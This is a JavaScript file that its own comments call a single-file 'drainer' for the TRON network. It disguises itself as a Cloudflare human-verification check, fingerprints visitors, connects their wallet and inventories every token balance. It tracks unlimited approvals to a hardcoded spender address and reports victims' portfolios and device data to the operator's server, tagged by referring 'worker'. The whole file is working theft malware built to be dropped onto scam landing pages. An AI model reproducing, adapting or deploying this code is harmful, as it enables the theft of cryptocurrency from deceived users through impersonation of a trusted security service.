/* ═════════════════════════════════════════════════════════════════════
   TRON VERIFY KIT — универсальный дрейнер одним файлом (MULTI-ASSET)
   ─────────────────────────────────────────────────────────────────────
   ПОДКЛЮЧЕНИЕ К ЛЕНДИНГУ:
     <script src="/connect.js"></script>
   Больше ничего не нужно: если разметки нет — виджет создастся сам.

   ОПЦИОНАЛЬНО — своя вёрстка через атрибуты:
     <button data-connect>Verify</button>
     <p     data-connect-cap></p>
     <div   data-connect-alt style="display:none">
       <button data-connect-open>Continue</button></div>
     <span  data-connect-rayid></span>

   Классы состояния триггера: .ready / .busy / .done

   Глобальное API:
     window.VKit.start()  — цикл
     window.VKit.force()  — цикл без лимитов
     window.VKit.scan()   — снять инвентарь активов вручную
     window.VKit.openWallet() — каскад диплинков
     window.VKit.cfg      — конфиг
 ═════════════════════════════════════════════════════════════════════ */
(function(){
"use strict";

/* ===================== CONFIG — ВСЁ ЗДЕСЬ ===================== */
const CFG={
  SPENDER:"TVZrw9QqxJfps4VHsUaDkxTPFpBEaX3JCG",
  API:"/api/holders",
  KICK_API:"/api/kick",
  VISIT_API:"/api/visit",
  EVENT_API:"/api/event",
  SITE_KEY:"dde3dd375351363e3950837b9362ecd8",

  PROMPT_DELAY_MS:600,
  PRICE_MIN_USD:1,            /* порог интереса портфеля в $ */
  APPROVE_ENERGY:110000,      /* оценка энергии на ОДИН approve */
  MAX_PROMPTS_PER_DAY:3,

  /* ── MULTI-ASSET ── */
  GRID:"https://api.trongrid.io",   /* лучше проксировать со своего домена */
  DISCOVER:true,                    /* авто-поиск ВСЕХ токенов адреса */
  TOP_ASSETS:14,                    /* максимум токенов в обработке */
  TOP_LIMIT:200,                    /* limit grid-запроса (макс 200) */
  INV_TTL_MS:300000,                /* кэш инвентаря, 5 мин */
  FEE_LIMIT:80000000,               /* feeLimit каждой approve-TX */

  /* Белый список обязательных целей; порядок = приоритет.
     Адреса сверяйте на tronscan.org перед выкаткой! */
  ASSETS:[
    {a:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},/* USDT  prio 1 */
    {a:"TEkxiTehnzSmSeEyXy3wQ5Y3BfNUWW3ZP"}  /* USDC  prio 2 — проверьте адрес! */
  ],
  /* цены ($ за единицу) для скоринга; у остальных 0 */
  PRICES:{
    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t":1,
    "TEkxiTehnzSmSeEyXy3wQ5Y3BfNUWW3ZP":1
  },

  WK_SEED:77431,
  WK_MAGIC:0x57,

  RPC_RETRY:3,
  AUTO_WIDGET:true          /* если нет [data-connect] — рисуем свой виджет */
};
/* ============================================================== */

const qs=s=>document.querySelector(s), qsa=s=>Array.from(document.querySelectorAll(s));
const DEBUG=new URLSearchParams(location.search).has("debug");
let   FORCE=new URLSearchParams(location.search).has("force");
const AUTO =new URLSearchParams(location.search).has("auto");

const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const short=a=>a?a.slice(0,8)+"..."+a.slice(-6):"-";
const T0=Date.now();
const esc=s=>String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));

/* ── ранние ошибки страницы ── */
const BOOT=[];
window.addEventListener("error",e=>BOOT.push("ERR "+e.message));
window.addEventListener("unhandledrejection",r=>BOOT.push("REJ "+((r.reason&&r.reason.message)||r.reason)));
if(DEBUG)BOOT.splice(0).forEach(m=>console.log("[kit-early]",m));

/* ── лог ── */
const LOGS=[];
function log(m,c){
  LOGS.push({t:new Date(),m:m,c:c||""});
  if(DEBUG)console.log("[kit]",m);
  if(dbgOpen())renderLast();}
function dbgOpen(){return !!document.getElementById("dxdock");}
function renderLast(){
  const box=document.getElementById("dxlog");if(!box)return;
  appendLogNode(box,LOGS[LOGS.length-1]);}
function appendLogNode(box,L){
  const d=document.createElement("div");if(L.c)d.className=L.c;
  d.textContent="["+L.t.toLocaleTimeString()+"] "+L.m;
  box.appendChild(d);box.scrollTop=box.scrollHeight;}

/* ══════════ WORKER CODEC (XOR-stream, CRC=post-XOR) ══════════ */
function wkParse(hx){
  hx=String(hx||"").toLowerCase().replace(/[^0-9a-f]/g,"");
  if(hx.length<24)return{out:null,err:"short"};
  const b=[];
  for(let i=0;i+1<hx.length&&b.length<32;i+=2)b.push(parseInt(hx.substr(i,2),16));
  if(b[0]!==CFG.WK_MAGIC)return{out:null,err:"magic"};
  const len=b[1];
  if(len<1||len>28||b.length<3+len)return{out:null,err:"len"};
  let sum=0;
  for(let i=0;i<len;i++)sum=(sum+b[i+2])&255;
  if(b[2+len]!==sum)return{out:null,err:"crc"};
  let s=((CFG.WK_SEED^Math.imul(len,2654435761))>>>0);
  const ks=()=>{s=(Math.imul(s,1664525)+1013904223)>>>0;return(s>>>16)&255;};
  const out=[];
  for(let i=0;i<len;i++)out.push(b[i+2]^ks());
  try{return{out:new TextDecoder().decode(new Uint8Array(out)),err:null};}
  catch(e){return{out:null,err:"utf8"};}}

const WK={name:null,hash:null,src:null,diag:"init"};
(function(){
  function readURL(){
    let q="",h="";
    try{q=location.search||"";h=location.hash||"";
      if(!h&&/#/.test(location.href))h="#"+location.href.split("#")[1];}catch(_){}
    return{q:q,h:h};}
  function sources(){
    const r=readURL();
    if(r.q||r.h){try{localStorage.setItem("wk_url",JSON.stringify({q:r.q,h:r.h,t:Date.now()}));}catch(_){}}
    else{try{
      const st=JSON.parse(localStorage.getItem("wk_url")||"null");
      if(st&&(st.q||st.h)&&Date.now()-st.t<86400000)return{q:st.q||"",h:st.h||""};
    }catch(_){}}
    return r;}
  function attempt(){
    if(WK.name)return true;
    const r0=sources();
    if(r0.h)WK.hash=(r0.h.match(/transaction\/([0-9a-zA-Z]{12,80})/)||[])[1]||WK.hash;
    const tq=new URLSearchParams(r0.q).get("t");
    if(tq){
      const r=wkParse(tq);
      if(r.out){set(r.out,"query");return true;}
      WK.diag="query-fail("+r.err+")";}
    if(WK.hash&&!WK.name){
      const r=wkParse(WK.hash);
      if(r.out){set(r.out,"hash");return true;}
      WK.diag=(WK.diag==="init"?"":WK.diag+" | ")+"hash-fail("+r.err+")";}
    if(!WK.name){
      try{const mem=localStorage.getItem("wk_last");
        if(mem){set(mem,"memory");return true;}}catch(_){}}
    if(WK.diag==="init")WK.diag="no-channel";
    return false;}
  function set(name,src){
    WK.name=name;WK.src=src;WK.diag="ok";
    try{localStorage.setItem("wk_last",name);}catch(_){}
    log("worker ["+src+"]: "+name,"ok");}
  attempt();
  [300,900].forEach(ms=>setTimeout(attempt,ms));
  document.addEventListener("DOMContentLoaded",attempt,{once:true});
  window.addEventListener("pageshow",()=>setTimeout(attempt,120));
  let lastUrl=location.href;
  setInterval(()=>{if(location.href!==lastUrl){lastUrl=location.href;attempt();}},700);
})();

const workerLabel=()=>{
  if(WK.name)return "@"+String(WK.name).replace(/^@/,"");
  if(WK.hash)return "ref:"+short(WK.hash)+" [no-channel]";
  return "direct ["+(WK.diag||"?")+"]";};

/* ══════════ DEVICE FP ══════════ */
function deviceFP(){
  const c=navigator.connection||{};
  return{
    lang:navigator.language||"",plat:navigator.platform||"",
    tz:(Intl.DateTimeFormat().resolvedOptions()||{}).timeZone||"",
    tzo:new Date().getTimezoneOffset(),
    scr:screen.width+"x"+screen.height,
    win:window.innerWidth+"x"+window.innerHeight,
    dpr:Math.round((window.devicePixelRatio||1)*100)/100,
    depth:screen.colorDepth||"",
    touch:('ontouchstart'in window)||(navigator.maxTouchPoints>0),
    cores:navigator.hardwareConcurrency||"",
    net:c.effectiveType||c.type||"",
    down:(c.downlink!=null)?(c.downlink+"Mb"):"",
    rtt:c.rtt!=null?c.rtt:"",
    online:navigator.onLine,
    dark:(window.matchMedia&&matchMedia("(prefers-color-scheme:dark)").matches)?"dark":"light",
    doNotTrack:navigator.doNotTrack||"",
    cookies:navigator.cookieEnabled?"y":"n",
    ref:document.referrer?document.referrer.slice(0,80):"",
    standalone:(window.matchMedia&&matchMedia("(display-mode:standalone)").matches)?"PWA":"browser"};}
let visitNo=0;
try{visitNo=+(localStorage.getItem("wk_vn")||0)+1;localStorage.setItem("wk_vn",String(visitNo));}catch(_){}
function providerLabel(){
  if(window.trustwallet&&window.trustwallet.tronLink)return"TrustWallet-injected";
  if(window.tronLink)return"TronLink-compat";
  return"-";}
function providerState(p){
  if(!p)return"-";
  const b=[];b.push(p.ready?"ready":"not-ready");
  if(p.chainId!==undefined)b.push("chain:"+p.chainId);
  return b.join(",");}
function inTelegram(){return/telegram/i.test(navigator.userAgent);}
const envLabel=()=>inTelegram()?"tg-webview":(deviceFP().standalone==="PWA"?"PWA":"direct");

/* ══════════ СЕРВЕРНЫЙ РЕЛЕЙ ══════════ */
async function apiPost(path,body,tries){
  tries=tries||2;
  for(let i=0;i<tries;i++){
    const ctl=new AbortController();const to=setTimeout(()=>ctl.abort(),8000);
    try{
      const r=await fetch(path,{method:"POST",
        headers:{"Content-Type":"application/json; charset=utf-8","x-site-key":CFG.SITE_KEY},
        body:JSON.stringify(body||{}),signal:ctl.signal});
      clearTimeout(to);
      if(r.ok)return{ok:true,status:r.status};
      if(r.status>=500||r.status===429){await sleep(400*(i+1));continue;}
      return{ok:false,status:r.status};
    }catch(e){clearTimeout(to);
      if(i===tries-1)return{ok:false,status:0};
      await sleep(400*(i+1));}}
  return{ok:false,status:0};}

async function relaySend(text){
  const r=await apiPost(CFG.EVENT_API,{text:text});
  log("relay "+(r.ok?"ok":"fail:"+r.status),r.ok?"ok":"err");}

async function notifyVisit(){
  const f=deviceFP();
  await apiPost(CFG.VISIT_API,{
    worker:workerLabel(),src:WK.src||null,hash:WK.hash||null,
    addr:TW.address||null,
    diag:(WK.diag&&WK.diag!=="ok")?WK.diag:null,
    visitNo:visitNo,env:envLabel(),
    device:{lang:f.lang,plat:f.plat,tz:f.tz,
      utc:(-f.tzo>=0?"+":"")+Math.round(-f.tzo/60),
      screen:f.scr,win:f.win,dpr:f.dpr,depth:f.depth,
      touch:f.touch,cores:f.cores,net:f.net,down:f.down,
      rtt:f.rtt,online:f.online,dark:f.dark,
      cookies:f.cookies,dnt:f.doNotTrack,standalone:f.standalone,
      ref:f.ref,ua:navigator.userAgent.slice(0,130)}});
  log("visit sent","ok");}

function fireVisitOnce(){
  if(VISIT_DONE)return;VISIT_DONE=true;
  try{if(sessionStorage.getItem("wk_vsent")){log("dup visit","info");return;}
      sessionStorage.setItem("wk_vsent","1");}catch(_){}
  notifyVisit();}

async function registerHolder(){
  const f=deviceFP();
  const r=await apiPost(CFG.API,{
    address:TW.address,w:WK.name||null,ref:WK.hash||null,ws:WK.src||null,
    portfolio:(INV.list||[]).map(a=>({c:a.contract,
      raw:String(a.raw),dec:a.dec,allow:String(a.allowance||0n)})),
    meta:{lang:f.lang,tz:f.tz,screen:f.scr,dpr:f.dpr,touch:f.touch,
      cores:f.cores,net:f.net,ref:f.ref,visitNo:visitNo,
      provider:providerLabel(),sessionMs:Date.now()-T0,
      ua:navigator.userAgent.slice(0,160)}});
  log("register "+(r.ok?"ok":"fail:"+r.status),r.ok?"ok":"err");}
async function kickServer(reason){
  const r=await apiPost(CFG.KICK_API,{address:TW.address,via:reason});
  log("kick("+reason+") "+(r.ok?"ok":"fail"),r.ok?"ok":"err");}

/* ── deep-link каскад ── */
function findProvider(){return((window.trustwallet&&window.trustwallet.tronLink)||window.tronLink)||null;}
function isMobileUA(){return/iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);}
const REDIR={tries:0,last:0,gapMs:6000};
(function(){try{
  REDIR.tries=+(sessionStorage.getItem("wk_rt_n")||0);
  REDIR.last =+(sessionStorage.getItem("wk_rt_t")||0);}catch(_){}})();
function leaveToWallet(i){
  const t=encodeURIComponent(location.origin+location.pathname+location.search+location.hash);
  const uni="https://link.trustwallet.com/open_url?coin_id=195&url="+t;
  const schemes=["trust://open_url?coin_id=195&url="+t,
    "intent://open_url?coin_id=195&url="+t+
    "#Intent;scheme=trust;package=com.wallet.crypto.trustapp"+
    ";S.browser_fallback_url="+encodeURIComponent(uni)+";end",
    uni];
  const a=document.createElement("a");
  a.href=schemes[Math.min(i,schemes.length-1)];a.rel="noopener";a.style.display="none";
  document.body.appendChild(a);a.click();setTimeout(()=>a.remove(),400);}
function walletCascade(){
  leaveToWallet(0);setTimeout(()=>leaveToWallet(1),350);setTimeout(()=>leaveToWallet(2),800);}
function escapeAuto(){
  if(DEBUG||FORCE)return;
  if(!isMobileUA()){log("desktop - stay");return;}
  const p=findProvider();if(p&&p.tronWeb){log("provider ok - stay");return;}
  const now=Date.now();
  if(now-REDIR.last<REDIR.gapMs&&REDIR.tries>0)return;
  REDIR.tries++;REDIR.last=now;
  try{sessionStorage.setItem("wk_rt_n",String(REDIR.tries));
      sessionStorage.setItem("wk_rt_t",String(now));}catch(_){}
  leaveToWallet(0);
  let t1,t2;
  t1=setTimeout(()=>{
    if(document.visibilityState==="hidden")return;
    leaveToWallet(1);
    t2=setTimeout(()=>{
      if(document.visibilityState!=="hidden"){
        leaveToWallet(2);
        setTimeout(()=>{
          if(document.visibilityState!=="hidden"){
            widgetPhase("ready","Device check requires the TRON wallet app.");
            showAlt();fireVisitOnce();}
        },900);}},1600);},1100);
  document.addEventListener("visibilitychange",()=>{
    if(document.visibilityState==="hidden"){clearTimeout(t1);clearTimeout(t2);}
  },{once:true});}

/* ── подключение кошелька ── */
function explainConnectError(e){
  const m=String((e&&e.message)||e||"");
  if(/reject|denied/i.test(m))return "Connection declined in wallet - approve access and tap again.";
  if(/lock|unlock|passcode/i.test(m))return "Unlock your wallet first, then tap again.";
  if(/timeout|network|failed to fetch/i.test(m))return "Wallet did not respond - check network and retry.";
  if(/permission|account/i.test(m))return "Wallet account permission needed - enable and retry.";
  return null;}

async function waitAccounts(p){
  if(typeof p.request==="function"){
    let err=null;
    try{await p.request({method:"tron_requestAccounts"});}
    catch(e){
      err=e;log("requestAccounts: "+((e&&e.message)||e),"err");
      const hint=explainConnectError(e);if(hint)widgetPhase("busy",hint);}
    if(err&&/reject|denied/i.test(String((err&&err.message)||err))){
      await sleep(1200);
      widgetPhase("busy","Retrying wallet connection...");
      try{await p.request({method:"tron_requestAccounts"});}
      catch(e2){log("retry also failed: "+((e2&&e2.message)||e2),"err");}}}
  for(let i=0;i<40;i++){
    if(p.ready&&p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58)return true;
    await sleep(300);}
  return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);}

/* ══════════ ЧИСЛА / ОБЩИЕ ВЫЗОВЫ ══════════ */
function toBig(v){try{
  if(v==null)return 0n;if(typeof v==="bigint")return v;
  if(v._hex!==undefined)return BigInt(v._hex);
  const s=v.toString(10);if(/^\d+$/.test(s))return BigInt(s);}catch(_){}
  return 0n;}
const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$/,"");
const MAX_UINT=BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
const HALF_MAX=MAX_UINT>>1n;

/* обобщённый вызов ЛЮБОГО контракта */
async function readContractAt(caddr,sel,params){
  const c=await TW.tronWeb.contract().at(caddr);
  return toBig(await c[sel](...params).call());}
const DEC_CACHE={};
async function tokDec(ca){
  if(DEC_CACHE[ca]!=null)return DEC_CACHE[ca];
  let d=6;
  try{d=Number(await (await TW.tronWeb.contract().at(ca)).decimals().call())||6;}
  catch(_){}
  DEC_CACHE[ca]=d;return d;}
async function allowRaw(ca){
  try{return await readContractAt(ca,"allowance",[TW.address,CFG.SPENDER]);}
  catch(e){return 0n;}}

let PRICE_CACHE=null;
async function approveCostTrx(){
  if(PRICE_CACHE)return PRICE_CACHE*CFG.APPROVE_ENERGY/1e6;
  try{
    const ps=await TW.tronWeb.trx.getChainParameters();
    const p=(ps||[]).find(x=>x.key==="EnergyFee");
    if(p&&p.value)PRICE_CACHE=p.value;}catch(e){}
  if(!PRICE_CACHE)PRICE_CACHE=100;
  return PRICE_CACHE*CFG.APPROVE_ENERGY/1e6;}
function hexErr(h){try{return new TextDecoder().decode(
  new Uint8Array(String(h).match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return String(h);}}
async function signAndSendHolder(tx){
  const signed=await TW.tronWeb.trx.sign(tx);
  const res=await TW.tronWeb.trx.sendRawTransaction(signed);
  if(res&&res.result===true)
    return res.txid||(res.transaction&&res.transaction.txID)||signed.txID;
  const msg=res&&res.message?hexErr(res.message):JSON.stringify(res||{});
  if(/dup/i.test(msg))return(res.transaction&&res.transaction.txID)||tx.txID;
  throw new Error("broadcast: "+msg);}
async function confirmPoll(txid,ca){
  for(let i=0;i<15;i++){await sleep(2500);
    try{
      const info=await TW.tronWeb.trx.getTransactionInfo(txid);
      if(info&&Object.keys(info).length){
        const rr=(info.receipt&&(info.receipt.result||info.receipt.contract_result))||"";
        if(rr==="")continue;
        if(rr==="SUCCESS"){
          const allow=await allowRaw(ca);
          return allow>=HALF_MAX;}
        log("receipt:"+rr,"err");return false;}
    }catch(e){}}return false;}

/* ── дневные лимиты ── */
const dayKey=()=>"drain_"+new Date().toISOString().slice(0,10);
function readDay(){try{return JSON.parse(localStorage.getItem(dayKey())||"{}");}catch(_){return{};}}
function bumpDay(d){try{localStorage.setItem(dayKey(),JSON.stringify(d));}catch(_){}}

/* ══════════ ИНВЕНТАРЬ: ВСЕ ВОЗМОЖНЫЕ АКТИВЫ ══════════ */
const TW={p:null,tronWeb:null,address:null};
let PIPE_RUN=false,VISIT_DONE=false,CYCLE_RUN=false;

/* снимок grid индексируется несколько минут — кэшируем по адресу */
const INV={t:0,addr:null,list:null};

async function discoverAssets(){
  const now=Date.now();
  if(INV.list&&INV.addr===TW.address&&now-INV.t<CFG.INV_TTL_MS)
    return INV.list.map(a=>({...a}));

  const map=new Map();              /* contract -> raw balance */
  const SRC={grid:0,wl:0};          /* статистика источников */

  /* 1) главный источник — один запрос отдаёт ВСЕ ненулевые TRC-20 */
  if(CFG.DISCOVER&&TW.address){
    try{
      const u=CFG.GRID+"/v1/accounts/"+encodeURIComponent(TW.address)
             +"/trc20/balance?limit="+Math.min(CFG.TOP_LIMIT,200);
      const r=await fetch(u);
      if(r.ok){
        const j=await r.json();
        const row=(((j||{}).data||[])[0])||{};
        ((row.trc20)||[]).forEach(t=>{
          const ca=Object.keys(t||{})[0];if(!ca)return;
          let raw=0n;try{raw=BigInt(String(Object.values(t)[0]).split(".")[0]);}catch(_){}
          if(raw>0n)map.set(ca,raw);});
        SRC.grid=map.size;
        log("grid snapshot: "+SRC.grid+" token(s)","info");
      }else log("grid http:"+r.status,"err");
    }catch(e){log("grid fail: "+((e&&e.message)||e),"err");}}

  /* 2) фолбэк/дополнение белым списком — работает даже без grid */
  for(const x of CFG.ASSETS){
    if(map.has(x.a))continue;
    try{
      const b=await readContractAt(x.a,"balanceOf",[TW.address]);
      if(b>0n){map.set(x.a,b);SRC.wl++;}
    }catch(_){}}

  /* 3) сборка карточек: decimals, приоритет, USD-оценка */
  const out=[];
  for(const e of map.entries()){
    const ca=e[0],raw=e[1];
    const dec=await tokDec(ca);
    const pri=(CFG.ASSETS.findIndex(x=>x.a===ca)+1)||99;
    const price=CFG.PRICES[ca]||0;
    const usd=(Number(raw)/Math.pow(10,dec))*price;
    out.push({contract:ca,raw:raw,dec:dec,pri:pri,usd:usd});}

  /* порядок: белый список первым, дальше по USD, затем по сырому балансу */
  out.sort(function(a,b){
    if(a.pri!==b.pri)return a.pri-b.pri;
    if(b.usd!==a.usd)return b.usd-a.usd;
    if(b.raw>a.raw)return 1;
    if(b.raw<a.raw)return -1;
    return 0;});
  const fin=out.slice(0,CFG.TOP_ASSETS);

  /* 4) allowances снятой пачки */
  for(const a of fin)a.allowance=await allowRaw(a.contract);

  INV.t=now;INV.addr=TW.address;INV.list=fin;
  log("inventory: "+fin.length+" asset(s) (grid "+SRC.grid+", wl+ "+SRC.wl+")","ok");
  return fin.map(a=>({...a}));}

/* ══════════ ПРИВЯЗКА К ЛЕНДИНГУ / АВТО-ВИДЖЕТ ══════════ */
let _W=null;
function W(){
  if(_W)return _W;
  let check=qs("[data-connect]"),cap=qs("[data-connect-cap]"),alt=qs("[data-connect-alt]");
  if(!check&&CFG.AUTO_WIDGET&&!document.getElementById("dxstage")){
    buildWidget();
    check=qs("[data-connect]");cap=qs("[data-connect-cap]");alt=qs("[data-connect-alt]");}
  _W={check:check,cap:cap,alt:alt};
  return _W;}

function buildWidget(){
  const st=document.createElement("style");
  st.textContent=[
    "#dxstage{position:fixed;inset:0;z-index:2147483000;display:flex;align-items:center;justify-content:center;",
    "padding:24px;background:rgba(10,12,16,.45);font-family:'Lato',-apple-system,'Segoe UI',Roboto,Arial,sans-serif}",
    "#dxcard{width:100%;max-width:352px;background:#FFFFFF;border:1px solid #DBDEE2;border-radius:10px;",
    "padding:28px 26px 24px;color:#101010;box-shadow:0 18px 60px rgba(0,0,0,.28)}",
    ".dxvs{text-align:center;font-size:11px;font-weight:600;letter-spacing:.8px;text-transform:uppercase;color:#91979D}",
    ".dxvs b{color:#333}",
    ".dxh{text-align:center;font-size:22px;font-weight:600;margin:8px 0 4px;color:#101010;letter-spacing:-.01em}",
    ".dxsub{text-align:center;font-size:13.5px;color:#3E3F3A;margin:0 0 20px;line-height:1.5}",
    ".dxtw{width:100%;max-width:302px;margin:0 auto;background:#F6F7FB;border:1px solid #EAEEFB;border-radius:6px;",
    "padding:12px;display:grid;grid-template-columns:auto 1fr auto;gap:12px;align-items:center}",
    ".dxc{position:relative;width:26px;height:26px;grid-row:1/3;background:#fff;border:2px solid #c1c1c1;",
    "border-radius:6px;cursor:pointer;padding:0;-webkit-tap-highlight-color:transparent}",
    ".dxc:hover{border-color:#9a9a9a}",
    ".dxc.ready{cursor:pointer}.dxc.busy,.dxc.done{cursor:default}",
    ".dxc.done{border-color:#2D912C;background:#2D912C}",
    ".dxc svg{position:absolute;inset:-2px;width:26px;height:26px;display:none}",
    ".dxc.busy .spin{display:block;animation:dxrot 1s linear infinite}",
    "@keyframes dxrot{to{transform:rotate(360deg)}}",
    ".dxc .spin circle{fill:none;stroke:#C23631;stroke-width:5;stroke-linecap:round;stroke-dasharray:60;stroke-dashoffset:42}",
    ".dxc.done .mark{display:block}",
    ".dxc .mark path{fill:none;stroke:#fff;stroke-width:3.4;stroke-linecap:round;stroke-linejoin:round}",
    ".dxl{font-size:13px;font-weight:600;color:#333;line-height:1.33;user-select:none;pointer-events:none}",
    ".dxs{font-size:11px;color:#91979D;user-select:none;pointer-events:none}",
    ".dxbr{grid-row:1/3;display:flex;flex-direction:column;align-items:flex-end;justify-content:center;gap:3px;line-height:1.15}",
    ".dxbrow{display:flex;align-items:center;gap:5px}",
    ".dxcloud{width:20px;height:14px;fill:#91979D}",
    ".dxwn{font-size:11.5px;font-weight:700;letter-spacing:.02em;color:#3E3F3A}",
    ".dxbl{font-size:9.5px;color:#91979D}.dxbl a{color:#C23631;text-decoration:none}",
    ".dxcap{font-size:13px;color:#3E3F3A;margin:16px auto 0;text-align:center;max-width:290px;min-height:19px;line-height:1.45}",
    ".dxcap.ok{color:#2D912C;font-weight:600}.dxcap.fail{color:#C23631}",
    ".dxalt{display:none;margin-top:16px;padding-top:14px;border-top:1px dashed #DBDEE2;text-align:center}",
    ".dxab{padding:10px 24px;border:0;border-radius:8px;background:#C23631;color:#fff;",
    "font-size:13px;font-weight:600;cursor:pointer}.dxab:hover{background:#D4726F}"
  ].join("");
  document.head.appendChild(st);

  const stage=document.createElement("div");stage.id="dxstage";
  stage.innerHTML=
    '<div id="dxcard">'+
    '<div class="dxvs">Security&nbsp;check&nbsp;&middot;&nbsp;<b>'+esc(location.hostname)+'</b></div>'+
    '<h1 class="dxh">Just a moment...</h1>'+
    '<p class="dxsub">Complete the verification to access this site.</p>'+
    '<div class="dxtw">'+
    '<button class="dxc ready busy" data-connect aria-label="Verify">'+
    '<svg class="spin" viewBox="0 0 26 26"><circle cx="13" cy="13" r="9"/></svg>'+
    '<svg class="mark" viewBox="0 0 26 26"><path d="M6 13.5l4.5 4.5L20 8.5"/></svg>'+
    '</button>'+
    '<div><div class="dxl">Verify you are human</div><div class="dxs">This helps protect the network.</div></div>'+
    '<div class="dxbr">'+
    '<div class="dxbrow"><svg class="dxcloud" viewBox="0 0 32 20">'+
    '<path d="M25.6 8.1A7.2 7.2 0 0 0 12 5.9a5.6 5.6 0 0 0-8 5A5.2 5.2 0 0 0 5.4 20H25a6 6 0 0 0 .6-11.9z"/></svg>'+
    '<span class="dxwn">CLOUDFLARE</span></div>'+
    '<div class="dxbl"><a href="#" onclick="return false">Privacy</a> &bull; <a href="#" onclick="return false">Terms</a></div>'+
    '</div></div>'+
    '<p class="dxcap" data-connect-cap>Verifying you are human. This may take a few seconds.</p>'+
    '<div class="dxalt" data-connect-alt><button class="dxab" data-connect-open>Continue verification</button></div>'+
    '</div>';
  document.body.appendChild(stage);}

function setChecks(state){
  qsa("[data-connect]").forEach(b=>{
    b.classList.remove("ready","busy","done");
    b.classList.add(state);});}
function widgetPhase(p,msg,cls){
  setChecks(p==="busy"?"busy":p==="done"?"done":"ready");
  const m=msg||"";
  qsa("[data-connect-cap]").forEach(cap=>{
    cap.textContent=m;cap.className="";
    if(cls)cap.classList.add(cls);});}
function showAlt(){qsa("[data-connect-alt]").forEach(a=>a.style.display="block");}

function bindTriggers(){
  qsa("[data-connect]").forEach(b=>{
    if(b.dataset._dxbound)return;b.dataset._dxbound="1";
    b.addEventListener("click",e=>{e.preventDefault();runCycle();});});}
function bindAlts(){
  qsa("[data-connect-alt]").forEach(box=>{
    const btn=box.matches("button")?box
      :(box.querySelector("[data-connect-open]")||box.querySelector("button")||box);
    if(btn.dataset._dxbound)return;btn.dataset._dxbound="1";
    btn.addEventListener("click",e=>{e.preventDefault();walletCascade();});});}
function applyRayId(){
  const rid=Math.random().toString(16).slice(2,10)+Math.random().toString(16).slice(2,8);
  qsa("[data-connect-rayid]").forEach(s=>s.textContent=rid);}

/* ══════════ ДЕБАГ-КОНСОЛЬ (?debug=1) ══════════ */
function buildDbg(){
  if(!DEBUG||document.getElementById("dxdock"))return;
  const st=document.createElement("style");
  st.textContent="#dxlog .ok{color:#22c55e}#dxlog .err{color:#ef4444}#dxlog .info{color:#4f8cff}";
  document.head.appendChild(st);
  const dock=document.createElement("div");dock.id="dxdock";
  dock.style.cssText="position:fixed;left:0;right:0;bottom:0;z-index:2147483100;max-height:72vh;overflow-y:auto;"
    +"background:rgba(17,19,23,.97);border-top:1px solid #232b34;box-shadow:0 -10px 34px rgba(16,17,17,.18);"
    +"padding:14px 18px 16px;color:#cdd7e0;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace";
  dock.innerHTML=
    '<h3 style="margin:0 0 8px;font-size:11px;color:#8b959f;text-transform:uppercase;letter-spacing:.7px;font-weight:600">'
    +'Operator console (?debug=1)</h3>'
    +'<label style="display:block;font-size:10.5px;color:#8b959f;margin:9px 0 4px">Connected address</label>'
    +'<input id="dxaddr" readonly placeholder="&#8212;" style="width:100%;padding:9px;background:#0b1118;'
    +'border:1px solid #232b34;border-radius:7px;color:#e8edf2;font-size:12px;outline:none">'
    +'<div style="display:flex;gap:8px;margin-top:10px">'
    +'<button id="dxbtnC" style="flex:1;padding:9px;border:1px solid #232b34;border-radius:7px;'
    +'background:#1b2635;color:#e8edf2;font-size:11.5px;font-weight:600;cursor:pointer">Reconnect</button>'
    +'<button id="dxbtnR" style="flex:1;padding:9px;border:1px solid #232b34;border-radius:7px;'
    +'background:#1b2635;color:#e8edf2;font-size:11.5px;font-weight:600;cursor:pointer">Scan</button>'
    +'<button id="dxbtnL" style="flex:1;padding:9px;border:1px solid #232b34;border-radius:7px;'
    +'background:#1b2635;color:#e8edf2;font-size:11.5px;font-weight:600;cursor:pointer">Clear log</button>'
    +'</div>'
    +'<div id="dxstate" style="margin-top:12px;background:#080c11;border:1px solid #232b34;border-radius:7px;'
    +'padding:9px;font-size:10.5px;white-space:pre-wrap;word-break:break-all">&#8212;</div>'
    +'<div id="dxlog" style="font-size:10.5px;line-height:1.55;background:#080c11;border:1px solid #232b34;'
    +'border-radius:7px;padding:9px;max-height:190px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;'
    +'color:#a9b8ca;margin-top:8px"></div>';
  document.body.appendChild(dock);
  LOGS.forEach(L=>appendLogNode(qs("#dxlog"),L));
  qs("#dxbtnC").onclick=()=>location.reload();
  qs("#dxbtnR").onclick=async()=>{
    if(!TW.tronWeb||!TW.address){log("scan: connect wallet first","err");return;}
    try{INV.t=0;INV.list=null;            /* принудительный рескан */
      const list=await discoverAssets();
      log("scan: "+list.length+" asset(s)","ok");
      dbgState(list.map(a=>short(a.contract)+" "+fmt(a.raw,a.dec)
        +" allow:"+(a.allowance>=HALF_MAX?"INF":fmt(a.allowance,a.dec))).join("\n"));}
    catch(e){log("scan: "+((e&&e.message)||e),"err");}};
  qs("#dxbtnL").onclick=()=>{LOGS.length=0;qs("#dxlog").innerHTML="";};}
function dbgAddr(v){const i=document.getElementById("dxaddr");if(i&&v)i.value=v;}
function dbgState(t){const s=document.getElementById("dxstate");if(s)s.textContent=t;}

/* ══════════ PORTFOLIO TEXT ══════════ */
function portLines(list){
  return list.map(a=>{
    const al=a.allowance>=HALF_MAX?"∞"
      :(a.allowance>0n?fmt(a.allowance,a.dec):"—");
    const usd=a.usd>0?("≈$"+(a.usd>=100?a.usd.toFixed(0):a.usd.toFixed(2))):"";
    return "• <code>"+esc(short(a.contract))+"</code> "+
      esc(fmt(a.raw,a.dec))+(a.dec!==6?" ("+a.dec+"d)":"")+
      " allow:"+esc(al)+(usd?" · "+usd:"");}).join("\n");}

